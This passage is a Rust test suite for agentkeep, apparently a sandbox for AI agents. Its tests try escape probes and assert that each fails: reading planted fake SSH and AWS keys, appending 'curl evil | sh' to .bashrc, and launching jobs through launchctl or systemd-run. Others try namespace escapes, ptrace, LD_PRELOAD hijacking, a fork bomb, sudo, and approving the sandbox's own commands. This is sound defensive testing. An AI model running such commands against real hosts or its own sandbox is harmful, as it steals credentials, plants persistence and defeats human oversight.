//! The escape suite: every test tries to do something the threat model says
//! a sandboxed process must not be able to do, and asserts that it fails
//! closed. Tests are named after threat-model ids (`docs/threat-model.md`).
//!
//! Fixtures are benign: fake keys with obvious markers, and no network
//! destination other than loopback.
//!
//! On a host where no backend is available every test prints
//! `UNTESTED ON THIS HOST` instead of passing silently. Set
//! `AGENTKEEP_REQUIRE_SANDBOX=1` (as Linux CI does) to turn that into a
//! failure.
//!
//! `AGENTKEEP_ESCAPE_BACKEND=<name>` runs the suite against one backend
//! (`linux`, `container`, `macos`); otherwise the first available one is
//! used. Each test names the controls it exercises, and a backend that does
//! not claim a control (per `agentkeep doctor --json`) gets a
//! `NOT APPLICABLE` line for it instead of a pass. Universal assertions
//! (secrets never leak, the host is never modified) run on every backend.
//!
//! Probes name host paths by their absolute location as well as through
//! `~`: on Linux both are the same (the home path is an empty tmpfs), while
//! the macOS backend points `HOME` at a private directory and leaves the
//! real home where it is, denied by the Seatbelt profile. Only the absolute
//! probes exercise that profile.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

/// True when CI demands that the sandbox really runs. An empty value counts
/// as unset so a matrix expression can clear it on other platforms.
fn require_sandbox() -> bool {
    std::env::var("AGENTKEEP_REQUIRE_SANDBOX").is_ok_and(|v| !v.trim().is_empty())
}

#[cfg(unix)]
mod suite {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use std::path::{Path, PathBuf};
    use std::process::{Command, Output};
    use std::sync::OnceLock;

    use super::require_sandbox;

    const FAKE_SSH_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE_TEST_KEY_NOT_REAL_agentkeep_escape_suite\n-----END OPENSSH PRIVATE KEY-----\n";
    const FAKE_AWS: &str = "[default]\naws_access_key_id = AKIA_TEST_FAKE_NOT_REAL\naws_secret_access_key = FAKE_TEST_SECRET_agentkeep\n";
    const FAKE_ENV_SECRET: &str = "sk-test-fake-agentkeep-escape-suite";

    fn bin() -> &'static str {
        env!("CARGO_BIN_EXE_agentkeep")
    }

    /// A fake home with planted secrets and a project directory.
    pub struct Harness {
        pub _root: tempfile::TempDir,
        pub home: PathBuf,
        pub project: PathBuf,
        /// Backend under test.
        pub backend: String,
        /// Controls it claims.
        pub controls: Vec<String>,
        /// Pass `--backend` explicitly.
        pub forced: bool,
    }

    impl Harness {
        /// Does the backend under test claim this control?
        pub fn claims(&self, control: &str) -> bool {
            self.controls.iter().any(|c| c == control)
        }

        /// Gate a test on a control. Prints `NOT APPLICABLE` and returns
        /// false when the backend does not claim it.
        pub fn requires(&self, id: &str, control: &str) -> bool {
            if self.claims(control) {
                return true;
            }
            let msg = format!(
                "NOT APPLICABLE [{id}] on backend `{}`: it does not claim `{control}` (see docs/limitations.md)",
                self.backend
            );
            println!("{msg}");
            eprintln!("{msg}");
            false
        }

        fn new(backend: &str, controls: &[String], forced: bool) -> Self {
            let root = tempfile::tempdir().unwrap();
            let home = root.path().join("home");
            let project = root.path().join("home/work/project");
            fs::create_dir_all(home.join(".ssh")).unwrap();
            fs::write(home.join(".ssh/id_ed25519"), FAKE_SSH_KEY).unwrap();
            fs::set_permissions(
                home.join(".ssh/id_ed25519"),
                fs::Permissions::from_mode(0o600),
            )
            .unwrap();
            fs::create_dir_all(home.join(".aws")).unwrap();
            fs::write(home.join(".aws/credentials"), FAKE_AWS).unwrap();
            fs::create_dir_all(home.join("other-project")).unwrap();
            fs::write(
                home.join("other-project/secret.txt"),
                "FAKE_OTHER_PROJECT_SECRET",
            )
            .unwrap();
            fs::write(home.join(".bashrc"), "# original\n").unwrap();
            fs::create_dir_all(&project).unwrap();
            fs::write(project.join("README.md"), "hello\n").unwrap();
            Command::new("git")
                .arg("init")
                .arg("-q")
                .current_dir(&project)
                .output()
                .ok();
            Self {
                _root: root,
                home,
                project,
                backend: backend.to_string(),
                controls: controls.to_vec(),
                forced,
            }
        }

        /// Run a shell snippet inside the sandbox. `extra_policy` is written
        /// to the project's agentkeep.toml (after `schema = 1`).
        pub fn run(&self, extra_policy: &str, script: &str) -> Output {
            if extra_policy.is_empty() {
                let _ = fs::remove_file(self.project.join("agentkeep.toml"));
            } else {
                fs::write(
                    self.project.join("agentkeep.toml"),
                    format!("schema = 1\n{extra_policy}"),
                )
                .unwrap();
            }
            let mut args = vec!["--no-ask", "run"];
            if self.forced {
                args.extend(["--backend", self.backend.as_str()]);
            }
            args.extend(["--", "sh", "-c", script]);
            Command::new(bin())
                .args(&args)
                .current_dir(&self.project)
                .env_clear()
                .env("HOME", &self.home)
                .env("PATH", std::env::var("PATH").unwrap_or_default())
                .env("USER", "escapetester")
                .env("FAKE_SECRET_TOKEN", FAKE_ENV_SECRET)
                .env("LD_PRELOAD", "/nonexistent/evil.so")
                // Harmless to the supervisor itself (a search path that does
                // not exist); it must not reach the command.
                .env("DYLD_LIBRARY_PATH", "/nonexistent/evil")
                .env("TERM", "dumb")
                .output()
                .expect("spawn agentkeep")
        }
    }

    /// Removes host files a test planted outside its temporary directory.
    struct Cleanup(Vec<PathBuf>);

    impl Drop for Cleanup {
        fn drop(&mut self) {
            for p in &self.0 {
                let _ = fs::remove_file(p);
            }
        }
    }

    /// Wall-clock bound for probes that could otherwise hang on a backend
    /// that wrongly lets them wait on the network.
    const BOUNDED: &str = "[limits]\nwall_time = \"60s\"\n";

    fn out(o: &Output) -> String {
        format!(
            "{}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        )
    }

    /// Backend chosen for this run: name, claimed controls, forced flag.
    type Selection = Result<(String, Vec<String>, bool), String>;

    #[allow(clippy::single_match_else)] // both arms are substantial
    fn select_backend() -> Selection {
        let o = Command::new(bin())
            .args(["doctor", "--json"])
            .output()
            .expect("run agentkeep doctor");
        let report: serde_json::Value = serde_json::from_slice(&o.stdout)
            .map_err(|e| format!("doctor --json unreadable: {e}"))?;
        let wanted = std::env::var("AGENTKEEP_ESCAPE_BACKEND")
            .ok()
            .filter(|v| !v.trim().is_empty());
        let backends = report["backends"].as_array().cloned().unwrap_or_default();
        let pick = backends.iter().find(|b| {
            b["available"] == true
                && wanted
                    .as_deref()
                    .is_none_or(|w| b["name"].as_str() == Some(w))
        });
        match pick {
            Some(b) => {
                let name = b["name"].as_str().unwrap_or_default().to_string();
                let controls = b["controls"]
                    .as_array()
                    .map(|a| {
                        a.iter()
                            .filter_map(|c| c.as_str().map(String::from))
                            .collect()
                    })
                    .unwrap_or_default();
                println!("escape suite: backend `{name}`, controls {controls:?}");
                Ok((name, controls, wanted.is_some()))
            }
            None => {
                let reasons: Vec<String> = backends
                    .iter()
                    .map(|b| format!("{}: {}", b["name"], b["reason"]))
                    .collect();
                Err(match wanted {
                    Some(w) => format!("backend `{w}` unavailable ({})", reasons.join("; ")),
                    None => format!("no sandbox backend available ({})", reasons.join("; ")),
                })
            }
        }
    }

    /// `Some(harness)` when a backend works here, `None` otherwise.
    pub fn harness(id: &str) -> Option<Harness> {
        static SELECTED: OnceLock<Selection> = OnceLock::new();
        match SELECTED.get_or_init(select_backend) {
            Ok((name, controls, forced)) => Some(Harness::new(name, controls, *forced)),
            Err(reason) => {
                let msg = format!("UNTESTED ON THIS HOST [{id}]: {reason}");
                println!("{msg}");
                eprintln!("{msg}");
                assert!(
                    !require_sandbox(),
                    "AGENTKEEP_REQUIRE_SANDBOX is set but the sandbox is unavailable: {reason}"
                );
                None
            }
        }
    }

    /// "No such file", "Operation not permitted" or "Permission denied":
    /// the access failed, whichever way the backend refuses it.
    fn refused(text: &str) -> bool {
        [
            "No such file",
            "Operation not permitted",
            "Permission denied",
        ]
        .iter()
        .any(|m| text.contains(m))
    }

    fn has(tool: &str) -> bool {
        Command::new("sh")
            .args(["-c", &format!("command -v {tool}")])
            .output()
            .is_ok_and(|o| o.status.success())
    }

    /// Assert that a probe failed and leaked nothing.
    fn assert_blocked(o: &Output, forbidden: &[&str], ctx: &str) {
        let text = out(o);
        for f in forbidden {
            assert!(!text.contains(f), "{ctx}: leaked `{f}`:\n{text}");
        }
    }

    // ---- F: filesystem ------------------------------------------------

    #[test]
    fn f1_ssh_and_cloud_credentials_are_absent() {
        let Some(h) = harness("F1") else { return };
        let o = h.run(
            "",
            "cat ~/.ssh/id_ed25519; cat ~/.aws/credentials; ls -la ~/.ssh ~/.aws; echo rc=$?",
        );
        assert_blocked(
            &o,
            &["FAKE_TEST_KEY", "AKIA_TEST_FAKE", "FAKE_TEST_SECRET"],
            "F1",
        );
        assert!(refused(&out(&o)), "{}", out(&o));
        if h.requires("F1 absent", "fs_absent") {
            assert!(out(&o).contains("No such file"), "{}", out(&o));
        }
        // The real locations, whatever HOME says inside.
        let home = h.home.display();
        let o = h.run(
            "",
            &format!(
                "cat '{home}/.ssh/id_ed25519'; cat '{home}/.aws/credentials'; ls -la '{home}/.ssh' '{home}/.aws'; head -c 64 '{home}/.ssh/id_ed25519'; echo rc=$?"
            ),
        );
        let text = out(&o);
        assert_blocked(
            &o,
            &["FAKE_TEST_KEY", "AKIA_TEST_FAKE", "FAKE_TEST_SECRET"],
            "F1 absolute",
        );
        assert!(refused(&text), "{text}");
        assert!(
            !text.lines().any(|l| l.ends_with(" id_ed25519")),
            "~/.ssh listed:\n{text}"
        );
    }

    #[test]
    fn f2_other_directories_in_home_are_absent() {
        let Some(h) = harness("F2") else { return };
        let o = h.run("", "cat ~/other-project/secret.txt; ls ~");
        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2");
        let listed = out(&o).lines().any(|l| l.trim() == "other-project");
        assert!(!listed, "other-project listed in home:\n{}", out(&o));
        let home = h.home.display();
        let o = h.run(
            "",
            &format!(
                "cat '{home}/other-project/secret.txt'; ls '{home}'; ls '{home}/other-project'; echo x > '{home}/other-project/new.txt'; echo rc=$?"
            ),
        );
        let text = out(&o);
        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2 absolute");
        assert!(
            !text
                .lines()
                .any(|l| l.trim() == "other-project" || l.trim() == "secret.txt"),
            "the real home or another project was listed:\n{text}"
        );
        assert!(
            !h.home.join("other-project/new.txt").exists(),
            "wrote into another project:\n{text}"
        );
    }

    #[test]
    fn f2_shared_tmp_is_private() {
        // Linux gives the sandbox its own /tmp; macOS denies the host's and
        // points TMPDIR at a private directory. Either way a file another
        // program left in /tmp is out of reach and nothing written lands
        // there.
        let Some(h) = harness("F2 tmp") else { return };
        let planted = PathBuf::from(format!("/tmp/agentkeep-escape-{}.txt", std::process::id()));
        let written = PathBuf::from(format!(
            "/tmp/agentkeep-escape-{}-written.txt",
            std::process::id()
        ));
        let _cleanup = Cleanup(vec![planted.clone(), written.clone()]);
        fs::write(&planted, "FAKE_TMP_SECRET_agentkeep\n").unwrap();
        let o = h.run(
            "",
            &format!(
                "cat '{}'; echo x > '{}'; touch \"$TMPDIR/agentkeep-probe\" && echo tmpdir-writable",
                planted.display(),
                written.display()
            ),
        );
        let text = out(&o);
        assert_blocked(&o, &["FAKE_TMP_SECRET"], "F2 tmp");
        assert!(
            !written.exists(),
            "a write reached the host's /tmp:\n{text}"
        );
        assert!(text.contains("tmpdir-writable"), "{text}");
    }

    #[test]
    fn f3_symlink_and_hardlink_tricks_fail() {
        let Some(h) = harness("F3") else { return };
        // Symlink created on the host pointing at the secret.
        std::os::unix::fs::symlink(
            h.home.join(".ssh/id_ed25519"),
            h.project.join("link-to-key"),
        )
        .unwrap();
        // Absolute host paths: identical to `~` on Linux, and the real files
        // (not the private HOME) on macOS.
        let home = h.home.display();
        let o = h.run(
            "",
            &format!(
                "cat ./link-to-key; ln -s '{home}/.aws/credentials' ./link2 && cat ./link2; ln '{home}/.ssh/id_ed25519' ./hardlink; echo ln-rc=$?; cat ./hardlink"
            ),
        );
        assert_blocked(&o, &["FAKE_TEST_KEY", "AKIA_TEST_FAKE"], "F3");
        if h.requires("F3 hardlink", "hardlink_safe") {
            assert!(
                !h.project.join("hardlink").exists(),
                "hardlink must not be created"
            );
        }
    }

    #[test]
    fn f4_host_processes_are_invisible() {
        let Some(h) = harness("F4") else { return };
        // Universal: a host process (this test, and on backends without a
        // pid namespace the supervisor itself, which is the shell's parent)
        // cannot be signalled. SIGWINCH is ignored by default, so a
        // regression shows up as a successful `kill`, not as damage.
        let test_pid = std::process::id();
        let o = h.run(
            "",
            &format!("kill -WINCH {test_pid}; echo kill-test-rc=$?; kill -WINCH $PPID; echo kill-parent-rc=$?"),
        );
        let text = out(&o);
        assert!(!text.contains("kill-test-rc=0"), "{text}");
        if !h.claims("pid_isolation") {
            assert!(!text.contains("kill-parent-rc=0"), "{text}");
        }
        if !h.requires("F4", "pid_isolation") {
            return;
        }
        let supervisor_pid = std::process::id();
        let o = h.run("", &format!("ls /proc | grep -c '^[0-9]'; test -d /proc/{supervisor_pid} && echo HOST_PID_VISIBLE; cat /proc/1/cmdline | tr '\\0' ' '; ls /proc/1/root/ 2>&1 | head -3"));
        let text = out(&o);
        assert!(!text.contains("HOST_PID_VISIBLE"), "{text}");
        let count: usize = text
            .lines()
            .next()
            .and_then(|l| l.trim().parse().ok())
            .unwrap_or(999);
        assert!(count < 10, "too many pids visible ({count}):\n{text}");
        assert!(
            text.contains("agentkeep"),
            "pid 1 should be agentkeep's init:\n{text}"
        );
    }

    #[test]
    fn f5_ptrace_and_process_memory_access_are_denied() {
        let Some(h) = harness("F5") else { return };
        if !h.requires("F5", "ptrace_denied") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [F5]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "",
            r#"python3 -c '
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
r = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
print("ptrace", r, os.strerror(ctypes.get_errno()))
r = libc.syscall(310, 1, None, 0, None, 0, 0)  # process_vm_readv on x86_64; harmless args
print("pvr", r, os.strerror(ctypes.get_errno()))
'"#,
        );
        let text = out(&o);
        assert!(text.contains("ptrace -1 Operation not permitted"), "{text}");
    }

    #[test]
    fn f6_mount_and_namespace_escapes_are_denied() {
        let Some(h) = harness("F6") else { return };
        if !h.requires("F6", "no_mount") {
            return;
        }
        let o = h.run(
            "",
            "unshare -Ur true; echo unshare-rc=$?; unshare -m true; echo unshare-m-rc=$?; /bin/mount -t tmpfs none /mnt 2>&1; echo mount-rc=$?; mkdir -p /tmp/newroot && (cd /tmp/newroot && /sbin/pivot_root . . 2>&1); echo pivot-rc=$?",
        );
        let text = out(&o);
        assert!(
            text.contains("unshare-rc=1") || text.contains("Operation not permitted"),
            "{text}"
        );
        assert!(!text.contains("mount-rc=0"), "{text}");
        assert!(!text.contains("pivot-rc=0"), "{text}");
    }

    #[test]
    fn f7_shell_rc_writes_do_not_reach_the_host() {
        let Some(h) = harness("F7") else { return };
        let o = h.run(
            "",
            "echo 'curl evil | sh' >> ~/.bashrc; echo 'x' > ~/.profile; echo rc=$?",
        );
        assert!(o.status.success(), "{}", out(&o));
        assert_eq!(
            fs::read_to_string(h.home.join(".bashrc")).unwrap(),
            "# original\n",
            "host .bashrc changed"
        );
        assert!(!h.home.join(".profile").exists(), "host .profile created");
        // The same through the real paths, plus a macOS launch agent. On
        // Linux these land in the sandbox's empty home; on macOS they are
        // refused. Neither may reach the host.
        let home = h.home.display();
        let o = h.run(
            "",
            &format!(
                "echo 'curl evil | sh' >> '{home}/.bashrc'; echo x > '{home}/.zshrc'; mkdir -p '{home}/Library/LaunchAgents' && echo '<plist/>' > '{home}/Library/LaunchAgents/dev.agentkeep.escape.plist'; echo rc=$?"
            ),
        );
        let text = out(&o);
        assert_eq!(
            fs::read_to_string(h.home.join(".bashrc")).unwrap(),
            "# original\n",
            "host .bashrc changed:\n{text}"
        );
        assert!(
            !h.home.join(".zshrc").exists(),
            "host .zshrc created:\n{text}"
        );
        assert!(
            !h.home.join("Library/LaunchAgents").exists(),
            "launch agent directory created on the host:\n{text}"
        );
    }

    #[test]
    fn f7_service_managers_cannot_run_code_outside() {
        // Asking launchd (macOS) or the systemd user manager (Linux) to run
        // a job would start it outside the sandbox. Both must fail; the job
        // would write a marker into the real home.
        let Some(h) = harness("F7 service") else {
            return;
        };
        let marker = h.home.join("escaped-via-service-manager");
        let label = format!("dev.agentkeep.escape.{}", std::process::id());
        let o = h.run(
            BOUNDED,
            &format!(
                "launchctl submit -l {label} -- /bin/sh -c 'echo ESCAPED > {m}' 2>&1; echo launchctl-rc=$?; systemd-run --user --quiet /bin/sh -c 'echo ESCAPED > {m}' 2>&1; echo systemd-run-rc=$?; sleep 2",
                m = marker.display()
            ),
        );
        if cfg!(target_os = "macos") {
            // Clean up from the host in case the submission got through.
            let _ = Command::new("launchctl").args(["remove", &label]).output();
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
        assert!(
            !marker.exists(),
            "a service manager ran code outside the sandbox:\n{}",
            out(&o)
        );
    }

    #[test]
    fn f8_project_persistence_writes_are_allowed_and_will_be_reported() {
        // Documented as detect-only: the sandbox must allow writes into the
        // project, including .git/hooks. This test pins the behaviour so a
        // future change to blocking is deliberate.
        let Some(h) = harness("F8") else { return };
        let o = h.run(
            "",
            "mkdir -p .git/hooks && echo '#!/bin/sh' > .git/hooks/pre-commit && echo wrote",
        );
        assert!(out(&o).contains("wrote"), "{}", out(&o));
        assert!(h.project.join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn f10_audit_log_and_global_policy_are_invisible() {
        let Some(h) = harness("F10") else { return };
        let home = h.home.display();
        let o = h.run("", &format!("ls ~/.local/share/agentkeep/sessions 2>&1; ls ~/.config/agentkeep 2>&1; ls '{home}/.local/share/agentkeep/sessions' 2>&1; ls '{home}/.local/share/agentkeep/sessions'/* 2>&1; cat '{home}/.local/share/agentkeep/sessions'/*/events.jsonl 2>/dev/null | head -c 200; cat /proc/mounts 2>/dev/null | grep -c sessions"));
        let text = out(&o);
        assert!(refused(&text), "{text}");
        assert!(!text.contains("events.jsonl"), "{text}");
        assert!(!text.contains("session.start"), "{text}");
        if h.requires("F10 mounts", "fs_absent") {
            assert!(
                text.lines().any(|l| l.trim() == "0"),
                "a session mount leaked:\n{text}"
            );
        }
        // ...while the log exists on the host.
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        assert!(sessions.exists());
    }

    // ---- E: environment -----------------------------------------------

    #[test]
    fn e1_secret_environment_variables_are_scrubbed() {
        let Some(h) = harness("E1") else { return };
        // `ps eww` on the parent: on macOS that is the supervisor, whose own
        // environment still holds the secret, and process arguments are
        // readable through sysctl unless the profile refuses it.
        let o = h.run(
            "",
            "env; cat /proc/1/environ | tr '\\0' '\\n'; cat /proc/self/environ | tr '\\0' '\\n'; ps eww -p $PPID 2>&1 | head -5; ps eww -A 2>&1 | head -200",
        );
        assert_blocked(&o, &[FAKE_ENV_SECRET, "FAKE_SECRET_TOKEN"], "E1");
        assert!(
            out(&o).contains("HOME="),
            "allowed variables must pass through"
        );
    }

    #[test]
    fn e2_loader_hijack_variables_are_scrubbed() {
        let Some(h) = harness("E2") else { return };
        let o = h.run(
            "",
            "env | grep -E '^(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]*)=' ; echo grep-rc=$?",
        );
        assert!(out(&o).contains("grep-rc=1"), "{}", out(&o));
    }

    // ---- N: network ---------------------------------------------------

    #[test]
    fn n3_n4_no_network_and_no_dns() {
        let Some(h) = harness("N3/N4") else { return };
        if !h.requires("N3/N4", "net_isolation") {
            return;
        }
        if h.requires("N3/N4 netns", "net_namespace") {
            let o = h.run(
                "",
                "getent hosts example.com; echo dns-rc=$?; cat /proc/net/dev | tail -n +3 | awk '{print $1}'; cat /proc/net/route | wc -l",
            );
            let text = out(&o);
            assert!(text.contains("dns-rc=2"), "{text}");
            let ifaces: Vec<&str> = text.lines().filter(|l| l.ends_with(':')).collect();
            assert_eq!(ifaces, vec!["lo:"], "only loopback may exist:\n{text}");
        }
        if has("python3") {
            let o = h.run("", "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"127.0.0.1\", 9)) if False else None; \ntry:\n s.connect((\"203.0.113.1\", 80)); print(\"CONNECTED\")\nexcept OSError as e: print(\"blocked\", e)'");
            assert!(!out(&o).contains("CONNECTED"), "{}", out(&o));
            // Name resolution from inside, on every backend: Linux has no
            // resolver at all; macOS must refuse the mDNSResponder socket
            // and service. A UDP datagram to a TEST-NET resolver must not
            // leave either.
            let o = h.run(
                BOUNDED,
                r#"python3 -c '
import socket
try:
    print("RESOLVED", socket.getaddrinfo("example.com", 80)[0][4])
except OSError as e:
    print("dns blocked", e)
u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    u.sendto(b"\x00" * 12, ("192.0.2.53", 53)); print("UDP_SENT")
except OSError as e:
    print("udp blocked", e)
'"#,
            );
            let text = out(&o);
            assert!(!text.contains("RESOLVED"), "{text}");
            assert!(text.contains("dns blocked"), "{text}");
            assert!(!text.contains("UDP_SENT"), "{text}");
        }
    }

    #[test]
    fn n5_host_loopback_services_are_unreachable() {
        // Threat N5: a service listening on the host's loopback. Linux gives
        // the sandbox its own loopback; on macOS the loopback is shared and
        // the profile must refuse every port except the proxy relay's.
        let Some(h) = harness("N5") else { return };
        if !h.requires("N5", "net_isolation") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [N5]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        let port = listener.local_addr().unwrap().port();
        let o = h.run(
            BOUNDED,
            &format!(
                r#"python3 -c '
import socket
for host in ("127.0.0.1", "localhost"):
    s = socket.socket(); s.settimeout(3)
    try:
        s.connect((host, {port})); print("CONNECTED", host)
    except OSError as e:
        print("blocked", host, e)
'"#
            ),
        );
        let text = out(&o);
        assert!(!text.contains("CONNECTED"), "{text}");
        assert!(text.contains("blocked 127.0.0.1"), "{text}");
        match listener.accept() {
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
            other => panic!("the host listener was reached: {other:?}\n{text}"),
        }
    }

    #[test]
    fn positive_control_proxy_is_reachable_and_enforces_the_allowlist() {
        // The one way out works, and it is the policy-checked one: a host
        // that is not allowed gets the proxy's 403 (no DNS lookup happens
        // for a denied name, and `.invalid` never resolves anyway).
        let Some(h) = harness("N1 proxy") else { return };
        if !has("curl") {
            println!("UNTESTED [N1 proxy]: curl missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            BOUNDED,
            "curl -sS -o /dev/null -w 'code=%{http_code}\\n' --max-time 20 http://agentkeep-escape-denied.invalid/; echo curl-rc=$?",
        );
        let text = out(&o);
        assert!(text.contains("code=403"), "{text}");
    }

    // ---- C: commands and processes ------------------------------------

    #[test]
    fn c3_no_capabilities_and_no_new_privs() {
        let Some(h) = harness("C3") else { return };
        // Universal: the real sudo, by absolute path past the shim, must not
        // run anything as root (no_new_privs on Linux; on macOS the profile
        // hides the sudoers files, so sudo cannot authorise anything).
        let o = h.run(
            "",
            "for s in /usr/bin/sudo /bin/sudo /usr/local/bin/sudo; do if [ -x \"$s\" ]; then \"$s\" -n true 2>&1 && echo \"ROOT_VIA $s\"; fi; done; echo done",
        );
        let text = out(&o);
        assert!(text.contains("done"), "{text}");
        assert!(!text.contains("ROOT_VIA"), "{text}");
        if !h.requires("C3", "no_caps") {
            return;
        }
        let o = h.run("", "grep -E '^(CapEff|CapPrm|CapBnd|CapAmb|NoNewPrivs):' /proc/self/status; id -u; sudo -n true 2>&1; echo sudo-rc=$?");
        let text = out(&o);
        for cap in [
            "CapEff:\t0000000000000000",
            "CapPrm:\t0000000000000000",
            "CapBnd:\t0000000000000000",
            "CapAmb:\t0000000000000000",
            "NoNewPrivs:\t1",
        ] {
            assert!(text.contains(cap), "missing `{cap}` in:\n{text}");
        }
        assert!(!text.contains("sudo-rc=0"), "{text}");
    }

    #[test]
    fn c4_resource_limits_are_applied() {
        let Some(h) = harness("C4") else { return };
        if !h.requires("C4", "rlimits") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [C4]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[limits]\nmemory = \"512M\"\npids = 64\n",
            "python3 -c 'import resource; print(\"nproc\", resource.getrlimit(resource.RLIMIT_NPROC)); print(\"as\", resource.getrlimit(resource.RLIMIT_AS))'; cat /sys/fs/cgroup/memory.max 2>/dev/null",
        );
        let text = out(&o);
        let cgroup = text.lines().any(|l| l.trim() == "536870912");
        assert!(text.contains("nproc (64, 64)"), "{text}");
        assert!(
            cgroup || text.contains("as (536870912, 536870912)"),
            "{text}"
        );
    }

    #[test]
    fn c4_core_dumps_are_disabled() {
        let Some(h) = harness("C4 core") else { return };
        if !h.requires("C4 core", "no_core_dumps") {
            return;
        }
        let o = h.run("", "ulimit -c");
        assert!(
            out(&o).lines().any(|l| l.trim() == "0"),
            "core dumps enabled:\n{}",
            out(&o)
        );
    }

    #[test]
    fn c4_fork_bomb_is_capped() {
        // Behavioural: with `pids = 64` a process tree cannot reach 200.
        // Linux counts only the sandbox (cgroup or RLIMIT_NPROC per user
        // namespace); macOS counts every process of the user, so its cap is
        // the user's process count at launch plus 64.
        let Some(h) = harness("C4 pids") else { return };
        let control = if h.claims("rlimits") {
            "rlimits"
        } else {
            "nproc_per_user"
        };
        if !h.requires("C4 pids", control) {
            return;
        }
        // Both kernels exempt uid 0 from RLIMIT_NPROC, so as root only a
        // cgroup could cap the tree. Documented in docs/limitations.md.
        let root = {
            use std::os::unix::fs::MetadataExt;
            fs::metadata(&h.project).unwrap().uid() == 0
        };
        if root {
            let msg = "NOT APPLICABLE [C4 pids] when run as root: the kernel exempts uid 0 from RLIMIT_NPROC (see docs/limitations.md)";
            println!("{msg}");
            eprintln!("{msg}");
            return;
        }
        if !has("python3") {
            println!("UNTESTED [C4 pids]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[limits]\npids = 64\nwall_time = \"60s\"\n",
            r#"python3 -c '
import os, time
pids, err = [], None
for i in range(200):
    try:
        p = os.fork()
    except OSError as e:
        err = e
        break
    if p == 0:
        time.sleep(3)
        os._exit(0)
    pids.append(p)
print("forked", len(pids), "error", err)
for p in pids:
    os.waitpid(p, 0)
'"#,
        );
        let text = out(&o);
        let forked: usize = text
            .lines()
            .find_map(|l| l.strip_prefix("forked "))
            .and_then(|l| l.split_whitespace().next())
            .and_then(|n| n.parse().ok())
            .unwrap_or_else(|| panic!("no fork count:\n{text}"));
        assert!(forked < 200, "fork bomb not capped:\n{text}");
        assert!(text.contains("Resource temporarily unavailable"), "{text}");
    }

    #[test]
    fn c5_seccomp_is_active_and_denies_kernel_attack_surface() {
        let Some(h) = harness("C5") else { return };
        if !h.requires("C5", "seccomp") {
            return;
        }
        let o = h.run("", "grep -E '^Seccomp:' /proc/self/status");
        assert!(out(&o).contains("Seccomp:\t2"), "{}", out(&o));
        if has("python3") {
            let o = h.run(
                "",
                r#"python3 -c '
import ctypes, os, platform
libc = ctypes.CDLL(None, use_errno=True)
nr = {"x86_64": 425, "aarch64": 425}[platform.machine()]  # io_uring_setup
r = libc.syscall(nr, 8, None); print("io_uring", r, os.strerror(ctypes.get_errno()))
nr = {"x86_64": 321, "aarch64": 280}[platform.machine()]  # bpf
r = libc.syscall(nr, 0, None, 0); print("bpf", r, os.strerror(ctypes.get_errno()))
'"#,
            );
            let text = out(&o);
            assert!(
                text.contains("io_uring -1 Operation not permitted"),
                "{text}"
            );
            assert!(text.contains("bpf -1 Operation not permitted"), "{text}");
        }
    }

    #[test]
    fn c1_c2_command_rules_are_enforced_through_shims() {
        let Some(h) = harness("C1/C2") else { return };
        let o = h.run(
            "",
            "git status >/dev/null && echo status-ok; git push origin main; echo push-rc=$?; sudo true; echo sudo-rc=$?",
        );
        let text = out(&o);
        assert!(text.contains("status-ok"), "{text}");
        assert!(text.contains("push-rc=126"), "{text}");
        assert!(text.contains("sudo-rc=126"), "{text}");
    }

    #[test]
    fn b3_sandbox_cannot_become_its_own_approver() {
        // The decision socket is reachable from inside; registering as an
        // approver there must be refused, and asked commands stay denied.
        let Some(h) = harness("B3") else { return };
        if !has("python3") {
            println!("UNTESTED [B3]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[approval]\ntransport = [\"socket\"]\ntimeout = \"3s\"\n",
            r#"python3 -c '
import os, socket
s = socket.socket(socket.AF_UNIX); s.connect(os.environ["AGENTKEEP_SOCKET"])
s.sendall(b"{\"kind\":\"approver\"}\n"); print("reply", s.recv(200).decode().strip())
p = os.path.join(os.path.dirname(os.environ["AGENTKEEP_SOCKET"]), "appr" + "ove.sock")
try:
    a = socket.socket(socket.AF_UNIX); a.connect(p); print("APPROVER_SOCKET_REACHED")
except OSError as e:
    print("host socket blocked", e.errno)
'; ls "$(dirname "$AGENTKEEP_SOCKET")" 2>&1; ls /run/agentkeep 2>/dev/null; git push origin main; echo push-rc=$?"#,
        );
        let text = out(&o);
        assert!(
            text.contains("approvers must use the host socket"),
            "{text}"
        );
        // Next to the decision socket on the host (macOS) or in
        // /run/agentkeep (Linux): never listed, never connectable.
        assert!(
            !text.contains("approve.sock"),
            "host approver socket visible:\n{text}"
        );
        assert!(!text.contains("APPROVER_SOCKET_REACHED"), "{text}");
        assert!(text.contains("host socket blocked"), "{text}");
        assert!(text.contains("push-rc=126"), "{text}");
    }

    // ---- S: agentkeep itself ------------------------------------------

    #[test]
    fn s1_project_policy_cannot_silently_unhide() {
        let Some(h) = harness("S1") else { return };
        // The real path: the policy's `~` is the host home on every backend,
        // while HOME inside is private on macOS.
        let key = format!("cat '{}/.ssh/id_ed25519'", h.home.display());
        // Without acknowledge: ignored, with a warning.
        let o = h.run(
